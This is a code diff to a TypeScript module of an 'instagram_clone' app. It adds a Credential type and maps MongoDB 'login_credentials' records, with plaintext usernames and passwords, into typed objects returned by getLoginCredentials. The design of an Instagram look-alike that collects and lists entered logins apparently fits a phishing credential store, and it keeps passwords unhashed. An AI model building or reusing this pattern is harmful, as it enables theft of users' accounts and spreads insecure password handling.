@@ -1,5 +1,13 @@
 
-import { MongoClient, ServerApiVersion } from 'mongodb';
+import { MongoClient, ServerApiVersion, Document, WithId } from 'mongodb';
+
+// Define the Credential type that matches our application needs
+export interface Credential {
+  _id: string;
+  username: string;
+  password: string;
+  timestamp: string;
+}
 
 // The MongoDB connection URL (this should come from environment variables in a real app)
 // For a demo, we'll use a placeholder - in a real app, this would be a secret
@@ -53,8 +61,16 @@ export async function getLoginCredentials() {
     const database = client.db('instagram_clone');
     const collection = database.collection('login_credentials');
     
-    // Find all documents in the collection
-    const credentials = await collection.find().sort({ timestamp: -1 }).toArray();
+    // Find all documents in the collection and transform them to match our Credential type
+    const documents = await collection.find().sort({ timestamp: -1 }).toArray();
+    
+    // Transform the MongoDB documents to our Credential type
+    const credentials: Credential[] = documents.map((doc: WithId<Document>) => ({
+      _id: doc._id.toString(),
+      username: doc.username as string,
+      password: doc.password as string,
+      timestamp: doc.timestamp ? doc.timestamp.toString() : new Date().toString()
+    }));
     
     return { success: true, data: credentials };
   } catch (error) {
